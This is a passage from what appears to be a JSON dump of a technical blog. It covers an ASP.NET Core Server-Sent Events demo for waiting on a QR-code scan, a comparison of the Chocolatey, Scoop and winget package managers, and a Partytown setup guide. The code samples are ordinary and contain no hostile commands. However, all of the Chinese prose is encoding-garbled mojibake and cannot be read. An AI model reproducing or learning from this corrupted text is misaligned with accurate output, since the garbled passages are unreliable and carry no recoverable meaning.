EventSource(\u0026#39;/sse/@ViewBag.Token\u0026#39;); function showResult(msg, error) { qrCodeWin \u0026amp;\u0026amp; qrCodeWin.close(); document.getElementById(\u0026#39;btn\u0026#39;).remove(); let h = document.getElementById(\u0026#39;h\u0026#39;); h.innerText = msg; if (error) h.style.color = \u0026#39;red\u0026#39;; } source.onmessage = function (event) { showResult(event.data); }; source.onerror = function (event) { showResult(event.data, true); }; function showQRCode() { qrCodeWin = window.open(\u0026#39;@Url.Content($\u0026#34;~/Home/QRCode/{ViewBag.Token}\u0026#34;)\u0026#39;, \u0026#39;_blank\u0026#39;, \u0026#39;width=300,height=300\u0026#39;); } \u0026lt;/script\u0026gt; åˆæ­¥æ¸¬è©¦æˆåŠŸï¼Œæ¥è‘—æ”¹å¯«æˆæ¨¡ä»¿æ‰‹æ©Ÿæƒ QR Code çš„ç™»å…¥æµç¨‹ã€‚åœ¨æˆ‘ Home åŠ ä¸€å€‹ Test æ–¹æ³•ï¼Œ/Views/Home/Test.cshtml å¦‚ä¸‹ï¼Œç›´æ¥åœ¨é é¢é¡¯ç¤º QR Codeï¼ŒQR Code æŒ‡å®šé€£çµè¢«å‘¼å«å¾Œç”± SSE å‚³ä¾†é€šçŸ¥ï¼Œç¶²é å°å‘æ¸¬è©¦æˆåŠŸç•«é¢ï¼š\nViews/Home/Test.cshtml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 @{ } \u0026lt;div class=\u0026#34;text-center\u0026#34;\u0026gt; \u0026lt;img id=\u0026#34;qrc\u0026#34; src=\u0026#34;@ViewBag.QRCodePng\u0026#34; alt=\u0026#34;QR Code\u0026#34; /\u0026gt; \u0026lt;div id=\u0026#34;msg\u0026#34;\u0026gt; Timeout: \u0026lt;span id=\u0026#34;t\u0026#34;\u0026gt;@ViewBag.TimeoutSecs\u0026lt;/span\u0026gt;s \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var source = new EventSource(\u0026#39;/sse/@ViewBag.Token\u0026#39;); source.onmessage = function (event) { location.href = \u0026#39;@Url.Action(\u0026#34;Succ\u0026#34;, \u0026#34;Home\u0026#34;)\u0026#39;; }; source.onerror = function (event) { document.getElementById(\u0026#39;qrc\u0026#39;).remove(); document.getElementById(\u0026#39;msg\u0026#39;).innerText = event.data; }; var timeout = @ViewBag.TimeoutSecs; var h = setInterval(function () { timeout--; document.getElementById(\u0026#39;t\u0026#39;).innerText = timeout; if (timeout == 0) clearInterval(h); }, 1000); \u0026lt;/script\u0026gt; ä»¥ä¸Šç¯„ä¾‹ä¸­ï¼Œä»¥æ‰‹æ©Ÿæƒç„ä¸¦ç€è¦½ QR Code å…§å«ç¶²å€åˆ¤å®šæˆåŠŸï¼Œæ”¹ç‚º App ä½¿ç”¨æ‰‹æ©Ÿå¯¦é«”ä¿å­˜çš„é‡‘é‘°å°éš¨æ©Ÿç”¢ç”Ÿå…§å®¹åšæ•¸ä½ç°½ç« ï¼Œå°‡å¯é”åˆ°å°ˆæ¥­æ°´æº–çš„å®‰å…¨é˜²è­·ï¼Œæœ‰æ©Ÿæœƒåšå‡ºåœŸç ²ç‰ˆå¤šé‡å› ç´ é©—è­‰æˆ–å…å¯†ç¢¼ç™»å…¥ã€‚\nç°¡å–®èªªä¸€ä¸‹ä¼ºæœå™¨ç«¯ç¨‹å¼å¯«æ³•ã€‚SSE éƒ¨åˆ†ä¸»è¦é  Lib.AspNetCore.ServerSentEvents ç¨‹å¼åº«è™•ç†ï¼ŒProgram.cs æœ‰ä»¥ä¸‹å¹¾å€‹åœ°æ–¹è¦æ”¹ï¼š(ä¸­æ–‡è¨»è§£è™•)\nProgram.cs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 using Lib.AspNetCore.ServerSentEvents; using sse_notify.Models; var builder = WebApplication.CreateBuilder(args); // è¨»å†Š SSE æœå‹™ builder.Services.AddServerSentEvents(); // æ”¹ç”± URL åŒ…å«çš„ Guid å–å¾— ClientId builder.Services.AddSingleton\u0026lt;IServerSentEventsClientIdProvider, SseClientIdFromPathProvider\u0026gt;(); // è‡ªè¨‚ä¸€å€‹ç¹¼æ‰¿ ServerSentEventsService åŠå¯¦ä½œ IServerSentEventsService çš„é¡åˆ¥è™•ç†é€šçŸ¥ // ä½¿ç”¨ç¨‹å¼åº«æä¾›çš„ AddServerSentEvents æ“´å……æ–¹æ³•è¨»å†Š builder.Services.AddServerSentEvents\u0026lt;SseNotifyService, InProcSseNotifyService\u0026gt;(options =\u0026gt; { // ç¨‹å¼åº«æä¾› KeepAlive åŠŸèƒ½ options.KeepaliveMode = ServerSentEventsKeepaliveMode.Always; options.KeepaliveInterval = 15; }); // Add services to the container. builder.Services.AddControllersWithViews(); var app = builder.Build(); app.UseStaticFiles(); app.UseRouting(); app.UseAuthorization(); // å®šç¾© SSE å°æ˜ çš„æœå‹™åŠè·¯ç”±åŠå‹åˆ¥ï¼Œæ¯æ¬¡ç­‰å¾…çš„æƒç„æ“ä½œç”¢ç”Ÿéš¨æ©Ÿ GUID è­˜åˆ¥ app.MapServerSentEvents\u0026lt;InProcSseNotifyService\u0026gt;(\u0026#34;/sse/{regex(^[=0-9a-z].+)$)}\u0026#34;); app.MapControllerRoute( name: \u0026#34;default\u0026#34;, pattern: \u0026#34;{controller=Home}/{action=Index}/{id?}\u0026#34;); app.Run(); è‡ªè¨‚é¡åˆ¥è¦ç¹¼æ‰¿ ServerSentEventsServiceï¼Œå¯«æ³•å¯åƒè€ƒ API æ–‡ä»¶ï¼Œä»¥ä¸‹æ˜¯æˆ‘çš„åšæ³•ã€‚QR Code æƒç„åŸ·è¡Œçµæœæ‰“ç®—ç”¨è¨‚é–±èˆ‡ç™¼å¸ƒè¨­è¨ˆæ¨¡å¼ï¼Œæ¸¬è©¦é–‹ç™¼éšæ®µé è¨˜æ†¶é«”ä¸­çš„ Dictionaryã€IMemoryCache äº¤æ›è³‡æ–™ï¼›åœ¨è² è¼‰å¹³è¡¡æ¶æ§‹æœƒæœ‰å¤šå°ä¸¦è¡Œï¼Œå‰‡éœ€è¦åˆ†æ•£å¼çš„è¨‚é–±ç™¼å¸ƒæ¶æ§‹ï¼Œå¯ä½¿ç”¨ Redisã€RabbitMQ ä¹‹é¡çš„è§£æ±ºæ–¹æ¡ˆã€‚ç‚ºæ­¤ï¼Œæˆ‘å®£å‘Šäº† SseNotifyService æŠ½è±¡å‹åˆ¥ï¼Œå…ˆåšäº† InProcessSseNotifyService ç”¨ IMemoryCache ç°¡å–®æå®šï¼Œæ­£å¼é‹è½‰å¦‚æœ‰éœ€è¦å†æ”¹ç”¨ Redis æˆ–å…¶ä»– MQ æ©Ÿåˆ¶å¯¦ä½œã€‚\nModels/SseNotifyService.cs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 using Lib.AspNetCore.ServerSentEvents; using Microsoft.Extensions.Options; namespace sse_notify.Models { // https://tpeczek.github.io/Lib.AspNetCore.ServerSentEvents/articles/getting-started.html public abstract class SseNotifyService : ServerSentEventsService, IServerSentEventsService { public SseNotifyService(IOptions\u0026lt;ServerSentEventsServiceOptions\u0026lt;ServerSentEventsService\u0026gt;\u0026gt; options) : base(options.ToBaseServerSentEventsServiceOptions\u0026lt;ServerSentEventsService\u0026gt;()) { } public abstract void Subscribe(Guid token, int timeoutSecs = 300); public async Task SendEventAsync(Guid token, string type, string message) { var client = this.GetClients().SingleOrDefault(o =\u0026gt; o.Id == token); if (client != null) { await client.SendEventAsync(new ServerSentEvent() { Type = type, Data = new List\u0026lt;string\u0026gt; { message } }); } } public abstract Task Notify(Guid token, string message); } } Models/InProcSseNotifyService.cs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 using Lib.AspNetCore.ServerSentEvents; using Microsoft.Extensions.Caching.Memory; using Microsoft.Extensions.Options; namespace sse_notify.Models; public class InProcSseNotifyService : SseNotifyService, IServerSentEventsService { private readonly IMemoryCache _cache; public InProcSseNotifyService(IOptions\u0026lt;ServerSentEventsServiceOptions\u0026lt;ServerSentEventsService\u0026gt;\u0026gt; options, IMemoryCache cache) : base(options.ToBaseServerSentEventsServiceOptions\u0026lt;ServerSentEventsService\u0026gt;()) { _cache = cache; } public override void Subscribe(Guid token, int timeoutSecs = 300) { var key = $\u0026#34;S:{token}\u0026#34;; var semaphore = new SemaphoreSlim(0); var timeout = TimeSpan.FromSeconds(timeoutSecs); _cache.Set(key, semaphore, timeout); var task = Task.Factory.StartNew(async () =\u0026gt; { //wait for semaphore to be released if (!await semaphore.WaitAsync(TimeSpan.FromSeconds(timeoutSecs))) await SendEventAsync(token, \u0026#34;error\u0026#34;, \u0026#34;Timeout\u0026#34;); //try get response else if (!_cache.TryGetValue\u0026lt;string\u0026gt;($\u0026#34;R:{token}\u0026#34;, out var res)) await SendEventAsync(token, \u0026#34;error\u0026#34;, \u0026#34;No response\u0026#34;); else await SendEventAsync(token, \u0026#34;message\u0026#34;, res); }); } public async override Task Notify(Guid token, string message) { var key = $\u0026#34;S:{token}\u0026#34;; if (!_cache.TryGetValue(key, out SemaphoreSlim semaphore)) throw new ApplicationException(\u0026#34;Token not found\u0026#34;); _cache.Set(\u0026#34;R:\u0026#34; + token.ToString(), message); semaphore.Release(); _cache.Remove(key); } } SSE ç¨‹å¼åº«è­˜åˆ¥å®¢æˆ¶ç«¯é€£ç·šçš„é è¨­åšæ³•æ˜¯å¾ HttpContext.User.Identity æŠ“ä½¿ç”¨è€…èº«åˆ†ï¼Œè‹¥ä½¿ç”¨è€…æœ‰å¤šæ¢ SSE é€£ç·šï¼Œæ¯æ¢é€£ç·šéƒ½å‚³è¨Šæ¯ä¹Ÿç„¡å¦¨ã€‚ä½†æˆ‘çš„æ‡‰ç”¨æƒ…å¢ƒï¼Œæ¯æ¬¡é¡¯ç¤º QR Code ç‚ºç¨ç«‹å‚³è¼¸é€šé“ï¼Œæœƒä»¥ GUID è­˜åˆ¥ï¼Œæ•…è¦è‡ªè¨‚è­˜åˆ¥ Client Id é‚è¼¯ã€‚åšæ³•æ˜¯å¯«å€‹è‡ªè¨‚é¡åˆ¥å¯¦ä½œ IServerSentEventsClientIdProviderï¼Œåœ¨ Program.cs DI è¨»å†Šæˆ Singletonï¼š\nModels/SseClientIdFromPathProvider.cs 1 2 3 4 5 6 7 8 9 10 11 12 public class SseClientIdFromPathProvider : IServerSentEventsClientIdProvider { public Guid AcquireClientId(HttpContext context) { var path = context.Request.Path.Value; var m = Regex.Match(path, @\u0026#34;(?i)/(?\u0026lt;g\u0026gt;[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})$\u0026#34;); if (m.Success) return Guid.Parse(m.Groups[\u0026#34;g\u0026#34;].Value); return Guid.NewGuid(); } public void ReleaseClientId(Guid clientId, HttpContext context) { } } ç‘£ç¢ç´°ç¯€é‚„ä¸å°‘ï¼Œå°±ä¸ä¸€ä¸€ä»‹ç´¹äº†ã€‚ç¯„ä¾‹å°ˆæ¡ˆå·²æ”¾ä¸Š Githubï¼Œå¤§å®¶å¦‚æœ‰èˆˆè¶£å†ä¸‹è¼‰å›å»ç ”ç©¶ã€‚\n","date":"2023-01-31T00:00:00Z","image":"https://live.staticflickr.com/65535/52659620952_e6d1186f14_o.jpg","permalink":"https://wayneblog.ga/2023-01-31/web-wait-for-qrcode-scan/","title":"ã€Server-Sent Eventã€‘åœ¨ç¶²é ç­‰å¾…æ‰‹æ©Ÿç«¯å®Œæˆæ“ä½œ"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\né€™äº›å¹´æˆ‘æ¼¸æ¼¸è®Šæˆ CLI æ„›å¥½è€…ï¼Œè¦ºå¾—å¾ˆå¤šæ™‚ä¾¯æ•²æŒ‡ä»¤æ¯”æ»‘æ»‘é¼ ç°¡å–®æœ‰æ•ˆç‡ï¼Œè·Ÿä¼™ä¼´æºé€šæ›´ç°¡æ½”ç²¾ç¢º(ä¾‹å¦‚ï¼šã€Œgit add Program.cs \u0026amp;\u0026amp; git commit -m \u0026ldquo;poc\u0026rdquo;ã€å°ä¸Šã€Œåˆ‡æ›åˆ° Git Changesï¼Œåœ¨ Changes çš„ Program.cs æŒ‰å³éµé» Stageï¼Œåœ¨ Message æ¬„ä½è¼¸å…¥ pocï¼Œç„¶å¾Œé»ä¸‹é¢é‚£å€‹ Commit\u0026hellip;ã€ï¼Œç°¡å–®åå€)ï¼Œå¸¸ç”¨æŒ‡ä»¤å¯ä»¥ç”¨è¨˜äº‹æœ¬ä¿å­˜å¿«é€Ÿé‡è¤‡æ“ä½œï¼Œå¯«å¹¾è¡Œç¨‹å¼å¯å°‡è¤‡é›œä½œæ¥­è‡ªå‹•åŒ–æˆ–æ”¹ç‚ºæ‰¹æ¬¡ä½œæ¥­æˆ–æ’ç¨‹ï¼Œæ¯” GUI æ“ä½œæ›´å®¹æ˜“æ“´å……åŠæ‡‰ç”¨ã€‚\nå®‰è£è»Ÿé«”é€™æª”äº‹ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œç¿’æ…£äº†åœ¨ Linux ä¸‹æŒ‡ä»¤ apt-get install XXX å°±è£å¥½è»Ÿé«”ï¼Œä¾¿æœƒè¦ºå¾— Google æ‰¾ç¶²ç«™ä¸‹è¼‰æª”æ¡ˆå†è·‘å®‰è£ç¨‹å¼æˆ–è§£å£“ç¸®çš„åšæ³•å¤ªç¹ç‘£ã€‚\nWindows å…¶å¯¦ä¹Ÿæœ‰ä¸‹æŒ‡ä»¤è£è»Ÿé«”çš„åšæ³•ï¼Œæœ€æ—©åªæœ‰ Chocolateyï¼Œå¾Œä¾†é™¸çºŒåŠ å…¥å…¶ä»–é¸æ“‡ï¼Œæˆ‘çš„è³‡è¨Šæœ‰é»è½å¾Œï¼Œåœ¨é€™ç¯‡åšå€‹æ›´æ–°ã€‚\nç›®å‰ Windows ä¸Šå¸¸ç”¨çš„æŒ‡ä»¤å¼è»Ÿé«”å®‰è£æœå‹™æœ‰ä¸‰å€‹ï¼šChcolateyã€Scoop åŠ wingetã€‚\nPoint Chocolatey Scoop winget é–‹ç™¼å•† Chocolatey Software, Inc. lukesampson Microsoft Corp. ç™¼å¸ƒæ™‚é–“ Mar. 2011 Sep. 2013 May 2020 æ˜¯å¦é–‹æº æ˜¯ æ˜¯ æ˜¯ å¥—ä»¶æ•¸é‡æˆªè‡³2020å¹´7æœˆ18æ—¥ 5036 2959 657 å¯ç”¨ç‰ˆæœ¬ since Win7ã€since Win2003 since Win7ã€since Win2008 Win10since ver 1709 é›£æ˜“åº¦ æœ‰é»éº»ç…© è¶³å¤  è¶³å¤  è‡ªå»ºå€‰åº« è¶³å¤  è¶³å¤  è¶³å¤  å…è²»/ä»˜è²» å…è²»éƒ¨åˆ†ä»˜è²» å…è²» å…è²» æ–¹ä¾¿æ€§ æœ‰é»éº»ç…© è¶³å¤  æœ‰é»éº»ç…© å¥—ä»¶åŒ…å…§å®¹ å¤ªæ£’äº† è¶³å¤  æœ‰é»éº»ç…© è³‡æ–™ä¾†æº (è¨»ï¼šè³‡æ–™æ™‚é–“ 2020/10ï¼Œå¥—ä»¶æ•¸å·²æœ‰è®ŠåŒ–)\nä¸‰è€…éƒ½æ˜¯é–‹æºè»Ÿé«”ï¼Œå¯å…è²»ä½¿ç”¨(Chcolatey æœ‰ä»˜è²»ç‰ˆæä¾›ä¼æ¥­éœ€è¦çš„é¡å¤–åŠŸèƒ½)ï¼Œç°¡å–®æ­¸ç´ä¸‰è€…çš„å·®ç•°ã€‚\n1. Chcolatey Chcolatey\nèµ·æºæœ€æ—©ï¼Œç›®å‰æœ‰è¶…é 9500 å€‹å¥—ä»¶ï¼Œæ¶µè“‹è¨±å¤šå¸¸ç”¨è»Ÿé«”(Chromeã€VLC Player)ï¼ŒChocolatey ä¾è³´ PowerShell åŠ NuGet é‹ä½œï¼Œå°éç¨‹å¼é–‹ç™¼ä½¿ç”¨è€…ä¾†èªªæ¯”è¼ƒè¤‡é›œï¼Œå®‰è£æ™‚éœ€è¦ç®¡ç†è€…æ¬Šé™ã€‚\n2. Scoop Scoop\nScoop çš„åˆè¡·æ˜¯ç”¨æ–¼å®‰è£ç³»çµ±å·¥å…·ï¼Œå°¤å…¶æ˜¯ Linux å¸¸ç”¨ä½† Windows ç¼ºå°‘çš„å·¥å…·ç¨‹å¼ã€‚å®ƒä¹Ÿèƒ½ç”¨ä¾†å®‰è£ä¸€èˆ¬æ¡Œé¢ç¨‹å¼ï¼Œä½†éœ€è¦æ–°å¢ç‰¹å®šå®‰è£ä¾†æº(Bucket)ã€‚\nScoop æœ€å¤§çš„å„ªé»æ˜¯è»Ÿé«”é™ç¸®åœ¨ä½¿ç”¨è€…ç’°å¢ƒï¼Œä¸ä¿®æ”¹ Registry åŠç³»çµ±è¨­å®šï¼Œä¸éœ€è¦ç®¡ç†è€…æ¬Šé™ï¼Œä¸ä¾è³´ PowerShell/NuGetï¼Œä½¿ç”¨è¼ƒç°¡å–®ã€‚\nè‹¥ç®—ä¸Šæ•£ä½ˆå„åœ°çš„ 1100 å€‹ Bucketï¼Œå¥—ä»¶æ•¸é‡å¯é” 27000 ç¨®ï¼Œä½†å¼•ç”¨æ™‚å¤šäº†æœå°‹ã€ç¢ºèªå°è±¡è·Ÿè¨­å®šä¾†æºçš„æ‰‹çºŒã€‚\n3. winget winget\n2020 å¹´æ‰æ¨å‡ºçš„ wingetï¼Œè¡€çµ±ç´”æ­£æ˜¯å…¶æœ€å¤§å„ªå‹¢ï¼Œwinget ç”±å¾®è»Ÿé–‹ç™¼ç¶­è­·ï¼Œä½†å› æ¨å‡ºæ™‚é–“è¼ƒæ™šï¼Œå¥—ä»¶æ•¸é‡ä¸å¦‚å‰äºŒè€…è±å¯Œï¼Œä¸”å› é€éå¾®è»Ÿå•†åº—å®‰è£ï¼Œé™å®š Windows 10 1709 ä¹‹å¾Œçš„ç‰ˆæœ¬æ‰èƒ½ä½¿ç”¨ï¼Œè·Ÿ Windows Terminal ä¸€æ¨£ï¼Œè¦æ‡‰ç”¨åœ¨ Server åŠç¶²è·¯å—é™ç’°å¢ƒå¾—èŠ±é»åŠŸå¤«ã€‚\nå°çµ è‹¥è¦å®‰è£ Windows ä¸Šçš„å·¥å…·ç¨‹å¼æˆ–è»Ÿé«”çš„è©±ï¼š\nChocolatey ä»æ˜¯æœ€æ–¹ä¾¿çš„é¸æ“‡ï¼Œå–®ä¸€ä¾†æºæ¶µè“‹å¹¾ä¹å¤§å°æœƒç”¨åˆ°çš„è»Ÿé«”ï¼Œä¸¦èƒ½è™•ç† Registryã€å³éµé¸å–®ç­‰ç³»çµ±å±¤æ¬¡è¨­å®šï¼Œä½†åŸ·è¡Œæ™‚éœ€è¦ç®¡ç†è€…æ¬Šé™ã€‚\nScoop ä»¥é–‹ç™¼ç”¨çš„å·¥å…·ç¨‹å¼ç‚ºä¸»ï¼Œæœ€å¤§çš„å„ªé»å®‰è£ç¯„åœæœƒé™åˆ¶åœ¨ç•¶æ™‚ç™»å…¥çš„ä½¿ç”¨è€…ç’°å¢ƒä¸‹ï¼Œä¸å¹²æ“¾ç³»çµ±è¨­è¨ˆä¹Ÿä¸éœ€è¦ç®¡ç†è€…æ¬Šé™ï¼›Scoop ä¹Ÿèƒ½å®‰è£ Chromeã€VLC æ’­æ”¾å™¨é€™é¡è»Ÿé«”ï¼Œä½†éœ€è¦æ‰¾åˆ°ä¸¦è¨­å®šå®‰è£ä¾†æºã€‚\nwinget æ˜¯å¾®è»Ÿçš„å®˜æ–¹æŒ‡ä»¤å®‰è£ç³»çµ±ï¼Œé è¨­é€éå¾®è»Ÿå•†åº—ä¸‹è¼‰å®‰è£ï¼Œè¦åœ¨ Windows Server æˆ–ç¶²è·¯å—é™ç’°å¢ƒä½¿ç”¨éœ€è²»é»å·¥å¤«ï¼Œä¸”å› å‡ºé“è¼ƒæ™šï¼Œæä¾›çš„è»Ÿé«”ç¨®é¡ä¸å¦‚å…¶ä»–äºŒè€…é½Šå…¨ã€‚\n","date":"2023-01-31T00:00:00Z","image":"https://live.staticflickr.com/65535/52660107874_752a7075c3_o.jpg","permalink":"https://wayneblog.ga/2023-01-31/windows-chocolatey-scoop-winget/","title":"ã€Windowsã€‘æŒ‡ä»¤å¼è»Ÿé«”å®‰è£æœå‹™æ¯”è¼ƒï¼šChocolateyã€Scoop èˆ‡ winget"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nå‰ç«¯æ•ˆèƒ½èª¿æ ¡çš„æŠ€æ³•å¤šå¦‚ç‰›æ¯›ï¼Œä½†æœ€æ˜é¡¯çš„æ•ˆèƒ½æ®ºæ‰‹ä¸å¤–ä¹æ˜¯ JavaScript ä½”ç”¨ Main Thread è€Œå°è‡´é é¢ç„¡æ³•å›æ‡‰çš„ç‹€æ³äº†ã€‚æœ€è¿‘ç ”ç©¶ Partytown é€™å€‹å‡½å¼åº«ï¼Œä»–ç”¨äº†ä¸€å€‹éå¸¸å·§å¦™çš„æŠ€å·§ï¼ŒæŠŠéƒ¨åˆ† JS è‡ªå‹•åˆ‡æ›åˆ° Web Workers èƒŒæ™¯åŸ·è¡Œã€‚é€™ç¯‡æ–‡ç« æˆ‘å°±ä¾†åˆ†äº«å¦‚ä½•å°‡ Partytown å®‰è£åˆ°ä»»æ„ç¶²ç«™ä¸­ã€‚\nå¦‚ä½•å®‰è£ Partytown åˆ°ä»»æ„ç¶²ç«™ é€é Partytown CLI ä¸‹è¼‰ Partytown å‡½å¼åº« ä»¥ä¸‹å‘½ä»¤æœƒåœ¨ç•¶å‰ç›®éŒ„å»ºç«‹ä¸€å€‹ ~partytown è³‡æ–™å¤¾(å»ºè­°çµ±ä¸€ç”¨é€™å€‹åç¨±)ï¼š\n1 npx \u0026#34;@builder.io/partytown\u0026#34; copylib ~partytown å°‡ ~partytown è³‡æ–™å¤¾ä¸Šå‚³åˆ°ç¶²ç«™æ ¹ç›®éŒ„ å¦‚æœæ˜¯ ASP.NET Core çš„è©±ï¼Œå¯ä»¥ä¸Šå‚³åˆ° wwwroot ç›®éŒ„ä¸‹ï¼Œæˆ–æ˜¯åœ¨ ASP.NET Core å°ˆæ¡ˆæ ¹ç›®éŒ„è¼¸å…¥ä»¥ä¸‹å‘½ä»¤ï¼š 1 npx \u0026#34;@builder.io/partytown\u0026#34; copylib \u0026#34;wwwroot\\~partytown\u0026#34; å¦‚æœæ˜¯ Node.js çš„è©±ï¼Œå¯ä»¥ä¸Šå‚³åˆ° public ç›®éŒ„ä¸‹ï¼Œæˆ–æ˜¯åœ¨ ASP.NET Core å°ˆæ¡ˆæ ¹ç›®éŒ„è¼¸å…¥ä»¥ä¸‹å‘½ä»¤ï¼š 1 npx \u0026#34;@builder.io/partytown\u0026#34; copylib \u0026#34;public/~partytown\u0026#34; ä½ ä¹Ÿå¯ä»¥è¨­å®šå¥½ package.json åŠ å…¥åˆ°å»ºç½®æµç¨‹ä¸­ï¼š\n1 npm install \u0026#34;@builder.io/partytown\u0026#34; package.json 1 2 3 4 5 6 { \u0026#34;scripts\u0026#34;: { \u0026#34;build\u0026#34;: \u0026#34;npm run partytown \u0026amp;\u0026amp; ng build\u0026#34;, \u0026#34;partytown\u0026#34;: \u0026#34;partytown copylib public/~partytown\u0026#34; } } ç¸½ä¹‹ï¼Œä¸Šå‚³åˆ°ç¶²ç«™æ ¹ç›®éŒ„å°±å°äº†ï¼(è©³è¦‹ Copy Library Files æœ‰æ›´å®Œæ•´çš„èªªæ˜)\nèª¿æ•´ç¶²é ä¸­çš„ \u0026lt;script\u0026gt; æ¨™ç±¤èªæ³• è«‹å°‡ä»¥ä¸‹ï¼š\n1 \u0026lt;script\u0026gt;...\u0026lt;/script\u0026gt; å…¨éƒ¨ä¿®æ”¹ç‚ºï¼š\n1 \u0026lt;script type=\u0026#34;text/partytown\u0026#34;\u0026gt;...\u0026lt;/script\u0026gt; å°±å¤§åŠŸå‘Šæˆï¼\nä½¿ç”¨çš„æ³¨æ„äº‹é … é›–ç„¶ Partytown å‡½å¼åº«çš„åˆè¡·éå¸¸ç†æƒ³ï¼Œå°±æ˜¯ç®¡ç†ç¬¬ä¸‰æ–¹ JS å‡½å¼åº«(third-party scripts)ï¼Œå¾¹åº•é™ä½ JS ä½”ç”¨ Main Thread çš„ç‹€æ³ã€‚ä½†å¯¦éš›ä¸Šé‚„æ˜¯æœ‰ä¸å°‘ JS æª”æ¡ˆåœ¨é€é Partytown è¼‰å…¥åˆ° Web Workers åŸ·è¡Œå¾Œå°±æ›æ‰äº†ï¼Œæ‰€ä»¥å¯¦éš›ä¸Š Partytown ä¸¦ä¸é©ç”¨æ–¼æ‰€æœ‰ JS åŸ·è¡Œï¼Œå› æ­¤ä¸å¤ªå»ºè­°æŠŠç¶²ç«™ä¸Šæ‰€æœ‰ JS éƒ½æ”¹ç”¨ Partytown ä¾†è¼‰å…¥ã€‚\né™¤æ­¤ä¹‹å¤–ï¼Œç›®å‰ Partytown å› ç‚ºæœ‰ç”¨åˆ° Atomics API çš„é—œä¿‚ï¼Œå®ƒçš„ç›¸å®¹æ€§ç¢ºå¯¦æœ‰äº›é™åˆ¶ï¼Œæœ‰äº›å¤ªèˆŠçš„æ‰‹æ©Ÿç‰ˆæœ¬æ˜¯æ²’æœ‰æ”¯æ´çš„ï¼è©³è¦‹ JavaScript built-in: Atomics | Can I use èªªæ˜ã€‚\næœ€å¾Œè¦æé†’å¤§å®¶çš„åœ°æ–¹ï¼Œå°±æ˜¯ä½¿ç”¨ Partytown çš„ Trade-Offs (æ¬Šè¡¡)ã€‚å› ç‚ºé€™å€‹ä¸–ç•Œæ²’æœ‰éŠ€å­å½ˆï¼Œæœ‰ä¸€å¥½å°±æ²’å…©å¥½ï¼Œä½¿ç”¨ Partytown ä¸è¦‹å¾—é©ç”¨æ‰€æœ‰çš„ç¶²é é–‹ç™¼æƒ…å¢ƒã€‚ä»¥ä¸‹æ˜¯ Partytown å®˜æ–¹èªç‚ºä¸é©ç”¨çš„åœ°æ–¹ï¼š\nå¤§é‡çš„ DOM æ“ä½œæœƒè¢«ç¯€æµ(Throttled DOM Operations) ç”±æ–¼åœ¨ Web Workers ç„¡æ³•ç›´æ¥å­˜å– DOMï¼Œæ‰€ä»¥ Partytown æœƒé€é onmessage äº‹ä»¶å‚³çµ¦ Main Thread ä¾†è™•ç†ï¼Œæ‰€ä»¥ DOM è™•ç†çš„é€Ÿåº¦åè€Œæœƒè®Šæ…¢ï¼\nåªè¦æ˜¯ UI ç‰¹åˆ¥åƒé‡çš„ JS å‡½å¼åº«ï¼Œè™•ç†å¤§é‡ DOM æ“ä½œï¼Œéƒ½ä¸å¤ªé©åˆç”¨ Partytown ä¾†ç®¡ç† å¦‚æœåŸ·è¡Œå¯¦éš›æ•ˆæœä¸ç†æƒ³ï¼Œå…¶å¯¦å°±é€™å€‹ JS ä¸è¦ç”¨ Partytown å³å¯ï¼\nè‹¥ç¬¬ä¸‰æ–¹å‡½å¼åº«åœ¨è¼‰å…¥æ™‚æ²’æœ‰è¨­å®š CORS Headers çš„è©±ï¼Œé€é Partytown æ˜¯ç„¡æ³•è¼‰å…¥çš„ å¿…é ˆé€é Proxying Requests å¾**ç›¸åŒä¾†æº(Same-origin)**è¼‰å…¥ï¼\näº‹ä»¶è™•ç†åªè¦ç”¨åˆ° event.preventDefault() å°±æœƒå¤±æ•ˆ é€é Web Workers åŸ·è¡Œ event callback æœƒå°è‡´ event.preventDefault() çš„è¡Œç‚ºå¤±æ•ˆï¼\nè‹¥é€é Partytown ç®¡ç†çš„ JS å‹•æ…‹å»ºç«‹ iframe çš„è©±ï¼Œdocument.cookieã€localStorage èˆ‡ sessionStorage éƒ½æœƒè®€ä¸åˆ°ï¼ åŸºæœ¬ä¸Šç¨‹å¼ä¸æœƒå ±éŒ¯ï¼Œä½†å°±æ˜¯æ²’æ•ˆæœï¼Œæ‰€ä»¥ä½¿ç”¨ä¸Šè¦æ³¨æ„ï¼\né€é setInterval() ä¸æ–·çš„å° document é€²è¡Œ DOM æ“ä½œ é€™ä¹Ÿæœƒå¤±å»ä½¿ç”¨ Partytown çš„åƒ¹å€¼ï¼Œå› ç‚ºé »ç¹çš„ DOM æ“ä½œåè€Œæœƒè®“ Web Workers éæ–¼å¿™ç¢Œï¼\nç›®å‰ç¢ºå®šå¾ˆé©åˆç”¨ Partytown ä¾†ç®¡ç†çš„ç¬¬ä¸‰æ–¹å‡½å¼åº«ï¼Œå¾å®˜ç¶²æ˜¯æœ‰æ•´ç†å‡ºä¾†çš„ï¼Œå¤§å®¶å¯ä»¥å¤šå¤šåˆ©ç”¨ï¼Œç…§è‘—å®˜ç¶²è¨­å®šå³å¯ï¼š\nCommon Services Facebook Pixel Google Tag Manager (GTM) ","date":"2023-01-30T00:00:00Z","image":"https://live.staticflickr.com/65535/52657535787_2ab04e0fac_o.jpg","permalink":"https://wayneblog.ga/2023-01-30/npm-partytown-from-web-worker/","title":"å‰ç«¯æ•ˆèƒ½èª¿æ ¡ï¼šä½¿ç”¨ Partytown å°‡ç¬¨é‡çš„ JavaScript æ”¾åˆ° Web Workers 